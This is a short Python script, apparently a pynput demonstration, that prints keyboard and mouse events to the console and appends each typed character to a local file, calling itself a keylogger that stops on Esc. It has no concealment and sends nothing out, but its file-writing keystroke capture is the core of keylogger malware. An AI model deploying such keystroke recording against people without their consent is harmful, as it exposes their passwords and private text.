# https://pypi.org/project/pynput/
# full documentation https://pynput.readthedocs.io/en/latest/index.html
from pynput import keyboard, mouse


def on_move(x, y):

    print('Pointer moved at {0}'.format((x, y)))
    #print("Pointer moved {0}-{1} at {1}".format("Down" if dy < 0 else "Up", "Left" if dx < 0 else "Right", (x, y)))

def on_click(x, y, button, pressed):

    print("{0} at {1}".format("Pressed" if pressed else "Release", (x, y)))
    
def on_scroll(x, y, dx, dy):

    print("Scrolled {0} at {1}".format("Down" if dy < 0 else "Up", (x, y)))

def on_press(key):
    
    print('{0} pressed'.format(key))

    # to store the key pressed
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

def on_release(key):
    
    print('{0} released'.format(key))

    if key == keyboard.Key.esc:
        # Stop listener
        print("Shutting down the keylogger...")
        return False


if __name__ == "__main__":

    # Collecting events from keyboard and mouse
    listener_key = keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    )
    
    listener_mouse = mouse.Listener(
        on_move=on_move,
        on_click=on_click,
        on_scroll=on_scroll
    )
    
    listener_key.start()
    listener_mouse.start()

    # to keep alive the console
    input()